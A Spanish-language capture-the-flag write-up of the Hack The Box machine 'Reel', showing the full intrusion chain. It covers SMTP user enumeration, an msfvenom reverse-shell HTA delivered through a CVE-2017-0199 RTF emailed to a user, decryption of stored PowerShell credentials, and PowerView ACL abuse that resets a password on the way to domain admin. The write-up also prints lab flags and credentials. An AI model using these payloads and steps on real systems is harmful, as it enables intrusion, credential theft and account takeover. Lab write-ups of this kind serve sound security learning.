@@ -1,0 +1,458 @@
+---
+layout: post
+title: Reel
+date: 2023-02-27
+description:
+img:
+fig-caption:
+tags: [OSCP, OSEP]
+---
+___
+
+<center><img src="/writeups/assets/img/Reel-htb/Reel.png" alt="" style="height: 394px; width:520px;"></center>
+
+***
+
+# Conocimientos
+
+* Inspección de metadatos
+
+* Validación de usuarios por SMTP
+
+* Creación de RTF malicioso [CVE-2017-0199]
+
+* Inspección de ACLs
+
+* Abuso del privilegio WriteOwner
+
+* Abuso del Privilegio WriteDacl
+
+* Information Disclosure (Escalada de Privilegios)
+
+***
+
+# Reconocimiento
+
+## Escaneo de puertos con nmap
+
+### Descubrimiento de puertos abiertos
+
+```null
+nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.77 -oG openports
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-27 17:54 GMT
+Nmap scan report for 10.10.10.77
+Host is up (0.10s latency).
+Not shown: 65527 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE
+21/tcp    open  ftp
+22/tcp    open  ssh
+25/tcp    open  smtp
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+593/tcp   open  http-rpc-epmap
+49159/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 40.66 seconds
+```
+
+### Escaneo de versión y servicios de cada puerto
+
+```null
+nmap -sCV -p21,22,25,135,139,445,593,49159 10.10.10.77 -oN portscan
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-27 17:55 GMT
+Nmap scan report for 10.10.10.77
+Host is up (0.11s latency).
+
+PORT      STATE SERVICE      VERSION
+21/tcp    open  ftp          Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_05-28-18  11:19PM       <DIR>          documents
+22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 8220c3bd16cba29c88871d6c1559eded (RSA)
+|   256 232bb80a8c1cf44d8d7e5e6458803345 (ECDSA)
+|_  256 ac8bde251db7d838389b9c16bff63fed (ED25519)
+25/tcp    open  smtp?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
+|     220 Mail Service ready
+|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
+|     220 Mail Service ready
+|     sequence of commands
+|     sequence of commands
+|   Hello: 
+|     220 Mail Service ready
+|     EHLO Invalid domain address.
+|   Help: 
+|     220 Mail Service ready
+|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+|   SIPOptions: 
+|     220 Mail Service ready
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|   TerminalServerCookie: 
+|     220 Mail Service ready
+|_    sequence of commands
+| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49159/tcp open  msrpc        Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port25-TCP:V=7.93%I=7%D=2/27%Time=63FCEE9F%P=x86_64-pc-linux-gnu%r(NULL
+SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Hello,3A,"220\x20Mail\x20S
+SF:ervice\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n")%
+SF:r(Help,54,"220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20EH
+SF:LO\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n"
+SF:)%r(GenericLines,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20s
+SF:equence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r
+SF:\n")%r(GetRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20
+SF:sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\
+SF:r\n")%r(HTTPOptions,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x
+SF:20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20command
+SF:s\r\n")%r(RTSPRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad
+SF:\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comma
+SF:nds\r\n")%r(RPCCheck,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSVer
+SF:sionBindReqTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSStatusReq
+SF:uestTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SSLSessionReq,18,"2
+SF:20\x20Mail\x20Service\x20ready\r\n")%r(TerminalServerCookie,36,"220\x20
+SF:Mail\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\
+SF:n")%r(TLSSessionReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Kerbero
+SF:s,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SMBProgNeg,18,"220\x20Mai
+SF:l\x20Service\x20ready\r\n")%r(X11Probe,18,"220\x20Mail\x20Service\x20re
+SF:ady\r\n")%r(FourOhFourRequest,54,"220\x20Mail\x20Service\x20ready\r\n50
+SF:3\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\
+SF:x20commands\r\n")%r(LPDString,18,"220\x20Mail\x20Service\x20ready\r\n")
+SF:%r(LDAPSearchReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(LDAPBindRe
+SF:q,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SIPOptions,162,"220\x20Ma
+SF:il\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n5
+SF:03\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of
+SF:\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\
+SF:x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comman
+SF:ds\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequenc
+SF:e\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\
+SF:x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x2
+SF:0commands\r\n");
+Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
+|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
+|   Computer name: REEL
+|   NetBIOS computer name: REEL\x00
+|   Domain name: HTB.LOCAL
+|   Forest name: HTB.LOCAL
+|   FQDN: REEL.HTB.LOCAL
+|_  System time: 2023-02-27T17:58:39+00:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+|_clock-skew: mean: 0s, deviation: 3s, median: -1s
+| smb2-security-mode: 
+|   302: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2023-02-27T17:58:38
+|_  start_date: 2023-02-27T17:51:58
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 223.61 seconds
+```
+
+## Puerto 21 (FTP)
+
+El usuario anónimo está habilitado. Me descargo todos los tres archivos a los que tengo acceso
+
+```null
+ftp 10.10.10.77
+Connected to 10.10.10.77.
+220 Microsoft FTP Service
+Name (10.10.10.77:rubbx): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+dftp> dir
+229 Entering Extended Passive Mode (|||41004|)
+125 Data connection already open; Transfer starting.
+05-28-18  11:19PM       <DIR>          documents
+226 Transfer complete.
+ftp> cd documents
+250 CWD command successful.
+ftp> prompt off
+Interactive mode off.
+ftp> mget *
+local: AppLocker.docx remote: AppLocker.docx
+229 Entering Extended Passive Mode (|||41006|)
+125 Data connection already open; Transfer starting.
+100% |********************************************************************************************************************************************************************|  2047        2.84 KiB/s    00:00 ETA
+226 Transfer complete.
+WARNING! 9 bare linefeeds received in ASCII mode.
+File may not have transferred correctly.
+2047 bytes received in 00:00 (2.43 KiB/s)
+local: readme.txt remote: readme.txt
+229 Entering Extended Passive Mode (|||41007|)
+150 Opening ASCII mode data connection.
+100% |********************************************************************************************************************************************************************|   124        1.03 KiB/s    00:00 ETA
+226 Transfer complete.
+124 bytes received in 00:00 (0.73 KiB/s)
+local: Windows Event Forwarding.docx remote: Windows Event Forwarding.docx
+229 Entering Extended Passive Mode (|||41008|)
+125 Data connection already open; Transfer starting.
+100% |********************************************************************************************************************************************************************| 14581       15.23 KiB/s    00:00 ETA
+226 Transfer complete.
+WARNING! 51 bare linefeeds received in ASCII mode.
+File may not have transferred correctly.
+14581 bytes received in 00:00 (14.59 KiB/s)
+```
+
+En el ```readme.txt```, dan una pista. Hay que enviar un archivo RTF que será revisado
+
+```null
+cat readme.txt
+please email me any rtf format procedures - I'll review and convert.
+
+new format / converted documents will be saved here.
+```
+
+El archivo ```AppLocker.docx``` contiene lo siguiente:
+
+<img src="/writeups/assets/img/Reel-htb/1.png" alt="">
+
+El otro documento está dañado
+
+<img src="/writeups/assets/img/Reel-htb/2.png" alt="">
+
+En los metadatos se filtra un usuario
+
+```null
+exiftool Windows\ Event\ Forwarding.docx -Creator
+Creator                         : nico@megabank.com
+```
+
+## Puerto 25 (SMTP)
+
+Pruebo a validarlo por SMTP, pero ```VRFY``` está deshabilitado
+
+```null
+telnet 10.10.10.77 25
+Trying 10.10.10.77...
+Connected to 10.10.10.77.
+Escape character is '^]'.
+220 Mail Service ready
+HELO test.com
+250 Hello.
+VRFY nico@megabank.com
+502 VRFY disallowed.
+```
+
+Pero puedo ponerlo como destinatario para enviarle un correo y en base a la respuesta ver si existe
+
+```null
+MAIL FROM: <rubbx@test.com>
+250 OK
+RCPT TO: <nico@megabank.com>
+250 OK
+```
+
+Existe una herramienta que lo automatiza
+
+```null
+smtp-user-enum -M RCPT -U mails -t 10.10.10.77
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... RCPT
+Worker Processes ......... 5
+Usernames file ........... mails
+Target count ............. 1
+Username count ........... 1
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ 
+
+######## Scan started at Mon Feb 27 18:30:38 2023 #########
+10.10.10.77: nico@megabank.com exists
+######## Scan completed at Mon Feb 27 18:30:39 2023 #########
+1 results.
+
+1 queries in 1 seconds (1.0 queries / sec)
+```
+
+En este [artículo](https://packetstormsecurity.com/files/142211/Microsoft-RTF-Remote-Code-Execution.html) explican como es posible ejecutar comandos a través de un archivo RTF. Utilizo este repositiorio de [Github](https://github.com/bhdresh/CVE-2017-0199). Para el payload en formato HTA se puede utilizar ```msfvenom```
+
+```null
+msfvenom -l formats | grep hta
+    hta-psh
+```
+
+```null
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.9 LPORT=443 -f hta-psh -o file.hta
+```
+
+```null
+python2 cve-2017-0199_toolkit.py -M gen -w file.rtf -u http://10.10.16.9/file.htb -t RTF -x 0
+```
+
+Envío el archivo por correo
+
+```null
+sendEmail -f rubbx@test.com -t nico@megabank.local -u Pwned -m Pwned -s 10.10.10.77:25 -a file.rtf
+Feb 27 18:48:16 localhost sendEmail[24582]: Email was sent successfully!
+```
+
+Gano acceso al sistema como ```nico```
+
+```null
+rlwrap nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.16.9] from (UNKNOWN) [10.10.10.77] 54720
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+htb\nico
+
+C:\Windows\system32>
+```
+
+Puedo ver la primera flag
+
+```null
+C:\Users\nico\Desktop>type user.txt
+type user.txt
+a3eac7bb36755fabe608bc012dbd9f47
+```
+
+# Escalada
+
+En el escritorio de ```nico``` hay credenciales almacenadas en formato SecureString
+
+```null
+C:\Users\nico\Desktop>type cred.xml
+type cred.xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">HTB\Tom</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
+    </Props>
+  </Obj>
+</Objs>
+```
+
+```null
+C:\Users\nico\Desktop>powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.getNetworkCredential() | Format-List *"
+powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.getNetworkCredential() | Format-List *"
+
+
+UserName       : Tom
+Password       : 1ts-mag1c!!!
+SecurePassword : System.Security.SecureString
+Domain         : HTB
+```
+
+Como está el SSH abierto no es necesario crear unas PSCredentials
+
+```null
+Microsoft Windows [Version 6.3.9600]                                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+
+tom@REEL C:\Users\tom>  
+```
+
+Esta máquina tiene una auditoria interna ya realizada. En un documento de texto pone que no hay forma de convertirse en ```Domain Admin```
+
+```null
+PS C:\Users\tom\Desktop\AD Audit> type note.txt                                                                                 
+Findings:                                                                                                                       
+
+Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).                                  
+
+Maybe we should re-run Cypher query against other groups we've created.    
+```
+
+Hay un archivo en formato CSV, que se puede abrir con ```libreoffice```. Lo transfiero a mi equipo para analizarlo. El usuario ```tom``` tiene ```WriteOwner``` sobre ```claire``` 
+
+<img src="/writeups/assets/img/Reel-htb/3.png" alt="">
+
+Primero hay que crear un objeto y luego ya retocarle las ACLs
+
+```null
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> Import-Module .\PowerView.ps1 
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -Rights ResetPassword -PrincipalIdentity tom
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> $SecPassword = ConvertTo-SecureString 'pwned123$!' -AsPlainText -Force             
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -Identity claire -AccountPassword $SecPassword 
+```
+
+Me conecto por SSH como este nuevo usuario, que es Administrador del dominio y puedo ver la segunda flag
+
+```null
+Microsoft Windows [Version 6.3.9600]                                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+
+claire@REEL C:\Users\claire>                                                                                                    
+```
+
+Este usuario tiene ```WriteDacl``` sobre ```Backup_Admins```, por lo que me puedo agregar al grupo
+
+<img src="/writeups/assets/img/Reel-htb/4.png" alt="">
+
+```null
+claire@REEL C:\Users\claire>net group Backup_Admins claire /add                                                                 
+The command completed successfully.
+```
+
+La flag todavía no la puedo ver
+
+```null
+claire@REEL C:\Users\Administrator\Desktop>type root.txt                                                                        
+Access is denied.                                                                                                               
+```
+
+En el directorio ```Backups``` hay una contraseña en texto claro
+
+```null
+PS C:\Users\Administrator\Desktop\Backup Scripts> dir | Select-String "Password"                                                
+
+BackupScript.ps1:1:# admin password                                                                                             
+BackupScript.ps1:2:$password="Cr4ckMeIfYouC4n!"                                                                                 
+```
+
+Es válida para el usuario ```Administrador``` y puedo ver la segunda flag
+
+```null
+Microsoft Windows [Version 6.3.9600]                                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+                                                                                 
+administrator@REEL C:\Users\Administrator\Desktop>type root.txt                                                                 
+5a3d057ef27131c0f017655fde4acbed 
+```
